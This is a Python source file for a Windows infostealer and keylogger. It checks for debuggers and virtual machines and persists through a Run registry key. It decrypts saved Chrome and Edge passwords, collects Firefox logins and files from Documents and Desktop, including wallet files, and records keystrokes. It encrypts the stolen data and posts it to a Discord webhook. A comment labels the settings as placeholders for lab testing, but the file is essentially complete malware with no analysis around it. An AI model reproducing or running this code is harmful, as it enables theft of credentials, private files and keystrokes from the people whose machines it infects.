import os
import sys
import time
import random
import string
import logging
import winreg
import psutil
import threading
import requests
import sqlite3
import base64
import pyWinhook as pyHook
import pythoncom
import win32crypt
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import windll, c_buffer, c_int
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(filename='stealer_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (placeholders for lab testing)
CONFIG = {
    'webhook_url': 'https://discord.com/api/webhooks/1234567890/abcdefg',  # Discord webhook URL
    'interval': 30,  # Exfiltration interval (seconds)
    'max_buffer': 1000,  # Buffer size
    'salt': b'st34l3r_s4lt_2025',  # AES key salt
    'retry_interval': 5,  # Retry delay
    'max_retries': 3,
    'browser_paths': {
        'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Login Data'),
        'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles'),
        'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default\Login Data')
    },
    'file_extensions': ['.txt', '.docx', '.pdf', '.jpg', '.png', '.wallet'],
    'target_dirs': [os.path.expanduser('~/Documents'), os.path.expanduser('~/Desktop')]
}

# Obfuscation: Junk code
def _obfuscated_junk(): return [random.randint(1, 100) for _ in range(random.randint(3, 7))]

# AES key derivation
def derive_key(password=CONFIG['salt']):
    try:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=password, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    except Exception as e:
        logging.error(f"Key derivation failed: {e}")
        return None

# Anti-debugging: NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Anti-sandbox: VM and timing checks
def is_sandbox():
    try:
        vm_indicators = ['vboxservice', 'vmtoolsd', 'qemu-ga']
        for proc in psutil.process_iter():
            if proc.name().lower() in vm_indicators:
                return True
        if psutil.disk_usage('/').total < 20 * 1024 * 1024 * 1024:  # <20GB
            return True
        if windll.kernel32.GetTickCount() < 60000:  # <1min uptime
            return True
        return False
    except Exception as e:
        logging.error(f"Sandbox check failed: {e}")
        return False

# Stealth: Registry persistence
def set_persistence():
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'SysSecure', 0, winreg.REG_SZ, os.path.abspath(__file__))
    except Exception as e:
        logging.error(f"Persistence setup failed: {e}")

# Stealth: Process hollowing simulation
def hollow_process():
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() in ['explorer.exe', 'svchost.exe']:
                return proc.pid
        return os.getpid()
    except Exception as e:
        logging.error(f"Process hollowing simulation failed: {e}")
        return os.getpid()

# Steal browser credentials (Chrome, Edge)
def steal_browser_credentials(data_buffer: list):
    try:
        for browser, db_path in CONFIG['browser_paths'].items():
            if 'firefox' in browser:
                continue
            if not os.path.exists(db_path):
                continue
            temp_db = os.path.join(os.getenv('TEMP'), f'{browser}_login_data')
            os.system(f'copy "{db_path}" "{temp_db}"')
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, user, encrypted_pass in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode()
                    data_buffer.append(f"\n[Browser {browser} {time.ctime().split(' ')[3]}]\nURL: {url}\nUser: {user}\nPass: {password}\n====")
                except Exception as e:
                    logging.error(f"Decrypting {browser} password failed: {e}")
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        logging.error(f"Browser credential theft failed: {e}")

# Steal Firefox credentials
def steal_firefox_credentials(data_buffer: list):
    try:
        firefox_dir = CONFIG['browser_paths']['firefox']
        for profile in os.listdir(firefox_dir):
            profile_path = os.path.join(firefox_dir, profile)
            logins_path = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_path):
                with open(logins_path, 'r') as f:
                    import json
                    logins = json.load(f)
                    for login in logins.get('logins', []):
                        data_buffer.append(f"\n[Firefox {time.ctime().split(' ')[3]}]\nURL: {login.get('hostname')}\nUser: {login.get('username')}\nPass: {login.get('encryptedPassword')[:50]} (encrypted)\n====")
    except Exception as e:
        logging.error(f"Firefox credential theft failed: {e}")

# Steal files
def steal_files(data_buffer: list):
    try:
        for directory in CONFIG['target_dirs']:
            for root, _, files in os.walk(directory):
                for file in files:
                    if any(file.endswith(ext) for ext in CONFIG['file_extensions']):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                data_buffer.append(f"\n[File {time.ctime().split(' ')[3]}]\nPath: {file_path}\nData: {base64.b64encode(f.read()).decode()[:100]}...\n====")
                        except Exception as e:
                            logging.error(f"File steal failed for {file_path}: {e}")
    except Exception as e:
        logging.error(f"File stealing failed: {e}")

# System info collection
def collect_system_info(data_buffer: list):
    try:
        system_info = (
            f"OS: {sys.platform}\n"
            f"CPU: {psutil.cpu_count()} cores\n"
            f"Memory: {psutil.virtual_memory().total // 1024 // 1024} MB\n"
            f"Hostname: {socket.gethostname()}\n"
            f"IP: {socket.gethostbyname(socket.gethostname())}"
        )
        data_buffer.append(f"\n[System Info {time.ctime().split(' ')[3]}]\n{system_info}\n====")
    except Exception as e:
        logging.error(f"System info collection failed: {e}")

# Exfiltrate data to Discord webhook
def exfil_to_webhook(fernet, data_buffer: list):
    try:
        if not data_buffer:
            return
        data = ''.join(data_buffer)
        encrypted = fernet.encrypt(data.encode()).hex()
        payload = {
            'content': f'**Stealer Data** (Encrypted):\n```{encrypted}```',
            'username': 'SysBot',
            'avatar_url': 'https://example.com/avatar.png'
        }
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        for _ in range(CONFIG['max_retries']):
            try:
                response = requests.post(CONFIG['webhook_url'], json=payload, headers=headers, timeout=10)
                if response.status_code in [200, 204]:
                    data_buffer.clear()
                    return
                time.sleep(CONFIG['retry_interval'])
            except requests.RequestException as e:
                logging.error(f"Webhook exfil attempt failed: {e}")
    except Exception as e:
        logging.error(f"Webhook exfiltration failed: {e}")

# Keylogger event handler
def on_keyboard_event(event, data_buffer: list, fernet, start_time: float) -> tuple[float, list]:
    try:
        data = (f"\n[Keylog {time.ctime().split(' ')[3]}] Window: {event.WindowName}"
                f"\n\tKey: {event.Key}\n====")
        data_buffer.append(data)
        
        if len(''.join(data_buffer)) > CONFIG['max_buffer']:
            exfil_to_webhook(fernet, data_buffer)
        
        if time.time() - start_time >= CONFIG['interval']:
            steal_browser_credentials(data_buffer)
            steal_firefox_credentials(data_buffer)
            steal_files(data_buffer)
            collect_system_info(data_buffer)
            exfil_to_webhook(fernet, data_buffer)
            return time.time(), []
        
        return start_time, data_buffer
    except Exception as e:
        logging.error(f"Keyboard event handling failed: {e}")
        return start_time, data_buffer

# Main stealer logic
def main():
    if is_debugged() or is_sandbox():
        sys.exit(1)
    set_persistence()
    hollow_process()
    
    fernet = derive_key()
    if not fernet:
        logging.error("Key derivation failed, exiting")
        sys.exit(1)
    
    data_buffer = []
    start_time = time.time()
    
    hook = pyHook.HookManager()
    hook.KeyDown = lambda e: globals().update(
        start_time=on_keyboard_event(e, data_buffer, fernet, start_time)[0],
        data_buffer=on_keyboard_event(e, data_buffer, fernet, start_time)[1]
    )
    hook.HookKeyboard()
    
    try:
        pythoncom.PumpMessages()
    except Exception as e:
        logging.error(f"Main loop failed: {e}")
    finally:
        hook.UnhookKeyboard()
        _obfuscated_junk()

if __name__ == "__main__":
    try:
        threading.Thread(target=main, daemon=True).start()
        while True:
            time.sleep(60)
            _obfuscated_junk()
    except Exception as e:
        logging.error(f"Main thread failed: {e}")
        sys.exit(1)
